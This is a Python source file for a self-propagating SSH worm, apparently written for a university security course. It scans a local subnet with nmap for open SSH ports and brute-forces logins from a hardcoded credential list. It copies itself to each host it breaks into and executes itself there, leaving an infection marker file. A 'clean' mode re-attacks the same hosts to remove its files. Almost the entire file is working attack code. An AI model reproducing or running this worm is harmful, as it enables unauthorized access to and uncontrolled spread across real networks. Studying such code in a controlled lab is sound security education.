import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces
# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	return os.path.isfile(INFECTED_MARKER_FILE)
	

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	file = open(INFECTED_MARKER_FILE, "w")
	file.write("UNEXPECTED ERROR: Compooper's been Compoopermised")

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/" + "worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("python /tmp/worm.py")


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).

	try:
		sshClient.connect(host,22, userName, password)
		return 0
	except paramiko.SSHException:
		print "Bad login"
		return 1
	except socket.error, exc:
		print "Caught exception socket.error : %s" % exc
		return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
	
	# Go through the credentials
	for (username, password) in credList:
		attemptResults = tryCredentials(host, username, password, ssh)
			
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
	
		if attemptResults == 0:
			print "Success: " + host + "\n"
			return ssh
		if attemptResults == 1:
			print "Probably wrong credentials: " + host + "\n"
		if attemptResults == 3:
			print "Probably the server is down or is not running SSH: " + host + "\n"
			
	# Could not find working credentials
	print "Failed to connect to: " + host		



def clean(sshClient):
	#Removes the current worm.py file and infected.txt file
	#from the system taking the parameter "-c or --clean"
	sftpClient = sshClient.open_sftp()
	sshClient.exec_command("rm /tmp/worm.py")
	sshClient.exec_command("rm /tmp/infected.txt")
	
	
####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
		
	return liveHosts


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
# ~ if not isInfectedSystem():
	# ~ orignalip = '192.168.1.2'
	# ~ thisPC = getMyIP()
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	
	#This function implements also having the option to clean
	#the system from the worm.  Checks if arguments are 
	#"-c or --clean" if the argument is correct then it cleans 
	#worm from every pc it can log into on the network.
	
	if isInfectedSystem():
		print "System already infected"
		sys.exit()
	else:
		print "Marking system and executing the worm."
		markInfected()
elif len(sys.argv) < 3:
	if sys.argv[1] == "-c" or sys.argv[1] == "--clean":
		print "Cleaning up worm."
		networkHosts = getHostsOnTheSameNetwork()
		for hosts in networkHosts:
			sshInfo = attackSystem(hosts)
			if sshInfo:
				print "Found infected host and cleaning"
				clean(sshInfo)
				print "System is rid of worm"
		
		print "Completed cleaning all hosts"
		sys.exit()
	else:
		print "Not recgonized as an internal or external command. \n"
else:
	print "Incorrect parameters.\n"
	sys.exit()
			
	
# TODO: Get the IP of the current system
hostIp = getMyIP()
print hostIp        

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
if hostIp in networkHosts:
	networkHosts.remove(hostIp)

print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infpected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		
		try: 
			remotepath = '/tmp/infected.txt'
			localpath = '/home/cpsc/'
			mysftpClient = sshInfo.open_sftp()
		        
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
			mysftpClient.get(remotepath, localpath)
		except IOError:
			print "This system should be infected"
		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
			spreadAndExecute(sshInfo)
		
		print "Spreading complete"	
	

